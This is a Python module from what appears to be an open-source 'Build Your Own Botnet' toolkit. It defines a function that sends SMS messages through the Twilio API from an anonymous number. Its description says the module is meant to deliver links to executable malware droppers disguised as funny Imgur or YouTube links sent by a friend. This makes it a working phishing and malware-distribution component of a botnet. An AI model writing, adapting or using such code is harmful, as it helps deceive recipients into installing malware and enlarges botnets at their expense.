#!/usr/bin/python
# -*- coding: utf-8 -*-
'Phone SMS Text Message (Build Your Own Botnet)'

# packages
import twilio.rest

# globals
command = True
packages = ['twilio']
platforms = ['win32','linux2','darwin']
results = {}
usage = 'phone [sid=SID] [token=TOKEN] [number=NUMBER] [message=MESSAGE]'
description = """
Use an anonymous online phone number to send an SMS text message
containing download links to executable client droppers disguised
as a link to a funny image/video on Imgur/YouTube sent from a friend
"""

# main
def run(message=None, number=None, sid=None, token=None):
	"""
	Send a SMS text message from an anonymous online phone
	number via Twilio

	`Required`
	:param str message:		text message body
	:param str number: 		recipient phone number
	:param str sid:			Twilio account SID
	:param str token:		Twilio account auth token

	"""
	try:
		if not all([message, number, sid, token]):
			return globals()['usage']
		number = '+{}'.format(str().join([i for i in str(number) if str(i).isdigit()]))
		cli = twilio.rest.Client(sid, token)
		phone = cli.outgoing_caller_ids.list()[0].phone_number
		msg = cli.api.account.messages.create(to=number, from_=phone, body=message)
		return "SUCCESS: text message sent to {}".format(number)
	except Exception as e:
		return "{} error: {}".format(run.__name__, str(e))
